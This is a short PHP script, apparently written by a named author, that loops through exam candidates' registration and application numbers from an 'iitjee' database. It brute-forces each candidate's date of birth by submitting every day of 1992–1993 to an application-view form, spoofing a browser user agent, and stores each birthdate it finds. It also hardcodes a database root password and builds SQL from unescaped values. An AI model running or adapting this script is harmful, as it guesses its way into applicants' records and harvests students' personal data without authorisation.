<?php
/** Initial form for birthdays
 * @author : Abhay Rana
 */
error_reporting(E_ALL);
set_time_limit(1000000);
include "Snoopy.class.php";
$snoopy=new snoopy;
//$snoopy->_httprequest(
$snoopy->agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
$db = new mysqli("localhost","root","nemoabhay","iitjee");
$re=$db->query("SELECT regno, form_no,date FROM `selected`");
while($people=$re->fetch_row()){
	$form = array();
	$url = "http://192.168.216.1/viewapp/index.php";
	$form['appln_no']=$people[1];
	$form['regn_no']=$people[0];
	$date_db = $people[2];
	if($date_db) continue;
	echo $people[0]."\n";
	for($y=1992;$y<=1993;$y++){
		for($m=1;$m<=12;$m++){
			for($d=1;$d<=31;$d++){				
				$form['day']=str_pad($d,2,'0',STR_PAD_LEFT);
				$form['month']=str_pad($m,2,'0',STR_PAD_LEFT);
				$form['year']=$y;
				$form['proceed']='Proceed';
				$date = $form['day']."/".$form['month']."/".$form['year'];
				echo $date."\r";
				$snoopy->submit($url,$form);
				//print_r($snoopy->headers);
				if($snoopy->status == 302 || $snoopy->status == 404){					
					echo "******************[$date]\n";
					$db->query("UPDATE selected set date = '$date' where regno = '{$people[0]}'");
					break 3;//move to the next person
				}
			}
		}
	}
	if($y==1993&&$m==12&&$d==31)
		$db->query("UPDATE selected set date = '-' where regno = '{$people[0]}'");
}
